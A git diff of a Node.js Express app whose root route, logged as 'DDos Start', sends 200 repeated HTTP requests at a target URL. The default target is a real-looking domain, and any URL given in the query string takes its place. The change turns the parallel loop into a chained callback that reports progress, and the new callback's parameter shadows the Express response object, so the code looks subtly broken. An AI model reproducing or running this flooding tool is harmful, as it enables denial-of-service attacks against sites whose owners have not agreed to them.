@@ -169,11 +169,10 @@ app.get('/all',function(req,res){
 })
 
 
-
-
 app.get('/',function(req,res){
 
     var loops=200;
+    var it=0
 
     var url="http://msit.in/"
 
@@ -185,6 +184,31 @@ app.get('/',function(req,res){
     {
         url=req.query.url;
     }
+
+
+var cb=function(res,data){
+
+    try{
+
+        lg('HTTP response  ' +(res.statusCode))
+        lg('HTTP response Size ' +data.length)
+        if(it<loops)
+        {
+            it++;
+            res.write('<br>Iteration : '+it+'/'+loops+' -- '+(100*(it/loops))+' % complete')
+            gethtml(url,cb)
+        }
+        else{
+            res.end()
+        }
+        
+    }catch(e)
+    {
+        
+    }
+};
+
+
 
     lg('DDos Start : '+url+' iterations : '+loops)
     res.write('<head>')
@@ -200,28 +224,9 @@ app.get('/',function(req,res){
  
      res.write('</h1>')   
 
-    var it=0
-
-    for(it=0;it<loops;it++)
-    {
-        res.write('<br>Iteration : '+it+'/'+loops+' -- '+(100*(it/loops))+' % complete')
-        gethtml(url,function(res,data){
-
-            try{
-
-                lg('HTTP response  ' +(res.statusCode))
-                lg('HTTP response Size ' +data.length)
-                
-            }catch(e)
-            {
-                
-            }
-        })
-        
-    }
-
-     
-    res.end()
+ 
+    gethtml(url,cb)
+    
 
     
 
